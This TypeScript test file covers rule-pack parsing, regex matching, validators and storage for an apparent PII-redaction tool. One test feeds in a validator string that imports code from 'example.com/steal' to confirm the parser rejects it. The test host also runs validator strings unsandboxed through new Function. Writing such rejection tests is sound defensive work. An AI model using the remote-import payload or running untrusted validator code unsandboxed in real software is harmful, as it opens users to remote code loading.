import { strict as assert } from 'node:assert';
import { EntityType } from '../src/lib/types';
import { compilePack } from '../src/lib/rules/compile';
import { findRuleMatches } from '../src/lib/rules/matcher';
import { parseRulePack, RulePackError, testRulePack } from '../src/lib/rules/parse';
import type { ScriptCall, ScriptValidatorHost } from '../src/lib/rules/sandbox';
import type { RulePack } from '../src/lib/rules/types';

// Node has no localStorage; rule packs are stored there
const store: Record<string, string> = {};
(globalThis as unknown as { localStorage: Pick<Storage, 'getItem' | 'setItem'> }).localStorage = {
  getItem: (key: string) => store[key] ?? null,
  setItem: (key: string, value: string) => { store[key] = value; },
};
const { getEnabledRulePatterns, getEnabledRulePacks, installRulePack, removeRulePack, setRuleEnabled, setRulePackEnabled } =
  await import('../src/lib/rules/store');
const { REGEX_PATTERNS } = await import('../src/utils/regex-patterns');

/** Runs validators with Function; the real host runs them in a locked-down worker */
class TestHost implements ScriptValidatorHost {
  calls: ScriptCall[] = [];
  async validate(pack: RulePack, calls: ScriptCall[]) {
    this.calls.push(...calls);
    return calls.map(call => {
      try {
        const fn = new Function(`return (${pack.validators![call.validator]})`)();
        const result = fn(call.match, { groups: call.groups, before: call.before, after: call.after });
        return typeof result === 'number' ? result : Boolean(result);
      } catch {
        return null;
      }
    });
  }
  dispose() {}
}

const employeePack: RulePack = {
  id: 'acme-hr',
  name: 'ACME HR',
  version: '1.0.0',
  rules: [
    {
      id: 'employee-id',
      name: 'Employee ID',
      pattern: 'EMP-(\\d{6})',
      validator: 'evenChecksum',
      examples: ['EMP-123456'],
      counterExamples: ['EMP-123453'],
    },
    {
      id: 'badge',
      name: 'Badge number',
      entityType: EntityType.CUSTOM,
      pattern: '(?:badge|工牌)\\s*[:：#]?\\s*(?<number>\\d{5})',
      flags: 'i',
      group: 'number',
      confidence: 0.6,
    },
    {
      id: 'salary',
      name: 'Salary',
      pattern: '\\$\\d{2,3},\\d{3}',
      contextKeywords: ['salary', '薪资'],
      contextWindow: 20,
      requireContext: true,
      excludeKeywords: ['example'],
      examples: ['salary: $85,000'],
      counterExamples: ['price: $85,000', 'example salary $85,000'],
    },
  ],
  validators: {
    // Digits must add up to an odd number
    evenChecksum: '(match) => match.replace(/\\D/g, "").split("").reduce((sum, d) => sum + Number(d), 0) % 2 === 1',
  },
};

// --- Parsing ---
assert.equal(parseRulePack(JSON.stringify(employeePack)).id, 'acme-hr');

function problemsOf(input: unknown): string[] {
  try {
    parseRulePack(input);
  } catch (error) {
    assert.ok(error instanceof RulePackError);
    return error.problems;
  }
  assert.fail('expected the pack to be rejected');
}

assert.deepEqual(problemsOf('not json'), ['The file is not valid JSON']);
assert.ok(problemsOf({ id: 'x', name: 'X', rules: [] }).includes('"rules" must be a non-empty list'));
assert.ok(problemsOf({ id: 'builtin', name: 'X', rules: [{ id: 'a', name: 'A', pattern: 'a' }] })[0].includes('may not be "builtin"'));
assert.ok(problemsOf({ id: 'x', name: 'X', rules: [{ id: 'a', name: 'A', pattern: '(' }] })[0].includes('invalid pattern'));
assert.ok(problemsOf({ id: 'x', name: 'X', rules: [{ id: 'a', name: 'A', pattern: 'a', validator: 'nope' }] })[0].includes('unknown validator'));
assert.ok(problemsOf({ id: 'x', name: 'X', rules: [{ id: 'a', name: 'A', pattern: 'a', flags: 'gy' }] })[0].includes('"flags"'));
assert.ok(problemsOf({ id: 'x', name: 'X', rules: [{ id: 'a', name: 'A', pattern: 'a', entityType: 'PREDEFINED' }] })[0].includes('"entityType"'));
assert.ok(problemsOf({ id: 'x', name: 'X', rules: [{ id: 'a', name: 'A', pattern: 'a', requireContext: true }] })[0].includes('needs "contextKeywords"'));
assert.ok(problemsOf({ id: 'x', name: 'X', rules: [{ id: 'a', name: 'A', pattern: 'a' }, { id: 'a', name: 'B', pattern: 'b' }] })[0].includes('duplicate id'));
assert.ok(problemsOf({
  id: 'x', name: 'X', rules: [{ id: 'a', name: 'A', pattern: 'a', validator: 'v' }],
  validators: { v: '() => import("https://example.com/steal")' },
})[0].includes('may not use "import"'));
console.log('Rule pack parsing passed');

// --- Conditions ---
const host = new TestHost();
const packs = new Map([[employeePack.id, employeePack]]);
const patterns = compilePack(employeePack);
const text = 'EMP-123453 and EMP-123456. Badge: 40213. salary: $85,000. price: $12,000. example salary: $99,000';
const matches = await findRuleMatches(text, patterns, { host, packs });
assert.deepEqual(matches.map(m => [m.pattern.ruleId, m.text]).sort(), [
  ['badge', '40213'],
  ['employee-id', 'EMP-123456'],
  ['salary', '$85,000'],
]);
const badge = matches.find(m => m.pattern.ruleId === 'badge')!;
assert.equal(text.slice(badge.index, badge.index + badge.text.length), '40213', 'group offset points at the group');
assert.equal(badge.pattern.detectionMethod, 'custom');
assert.equal(host.calls[0].before, '');
assert.deepEqual(host.calls[0].groups, ['123453']);
assert.deepEqual(await testRulePack(employeePack, host), []);

// A validator returning a number sets the confidence; one that throws keeps the match
const scored: RulePack = {
  id: 'scored', name: 'Scored',
  rules: [{ id: 'a', name: 'A', pattern: 'A\\d', validator: 'score' }, { id: 'b', name: 'B', pattern: 'B\\d', validator: 'broken' }],
  validators: { score: '(m) => Number(m[1]) / 10', broken: '() => { throw new Error("bug") }' },
};
const scoredMatches = await findRuleMatches('A7 B1', compilePack(scored), { host, packs: new Map([['scored', scored]]) });
assert.equal(scoredMatches.find(m => m.text === 'A7')!.confidence, 0.7);
assert.ok(scoredMatches.some(m => m.text === 'B1'));

// Without a sandbox, matches that need one are kept rather than silently lost
assert.equal((await findRuleMatches('EMP-123453', compilePack(employeePack))).length, 1);

// An empty match must not hang
assert.deepEqual(await findRuleMatches('abc', compilePack({ id: 'e', name: 'E', rules: [{ id: 'e', name: 'E', pattern: 'x*' }] })), []);

// Self-test reports examples the rule misses
const failures = await testRulePack({ id: 't', name: 'T', rules: [{ id: 'r', name: 'R', pattern: 'abc', examples: ['xyz'], counterExamples: ['abc'] }] });
assert.deepEqual(failures, ['Rule "r" did not detect its example "xyz"', 'Rule "r" detected its counter-example "abc"']);
console.log('Rule conditions and validators passed');

// --- Built-in pack ---
for (const pattern of REGEX_PATTERNS) {
  for (const example of pattern.examples) {
    const found = await findRuleMatches(example, [pattern]);
    assert.ok(found.length > 0, `${pattern.name} detects its example ${example}`);
  }
}
console.log(`Built-in pack: ${REGEX_PATTERNS.length} rules detect their examples`);

// --- Store ---
const builtinCount = getEnabledRulePatterns().length;
assert.equal(builtinCount, REGEX_PATTERNS.length);
installRulePack(employeePack);
assert.equal(getEnabledRulePatterns().length, builtinCount + 3);
assert.ok(getEnabledRulePacks().has('acme-hr'));
setRuleEnabled('acme-hr', 'salary', false);
assert.equal(getEnabledRulePatterns().length, builtinCount + 2);
setRuleEnabled('builtin', 'email', false);
assert.ok(!getEnabledRulePatterns().some(p => p.ruleId === 'email'));
setRuleEnabled('builtin', 'email', true);
installRulePack({ ...employeePack, version: '1.1.0' });
assert.equal(getEnabledRulePatterns().length, builtinCount + 2, 'updating a pack keeps rules switched off');
setRulePackEnabled('acme-hr', false);
assert.equal(getEnabledRulePatterns().length, builtinCount);
assert.ok(!getEnabledRulePacks().has('acme-hr'));
removeRulePack('acme-hr');
assert.equal(JSON.parse(store['safe-redact-rule-packs']).packs.length, 0);
console.log('Rule pack store passed');
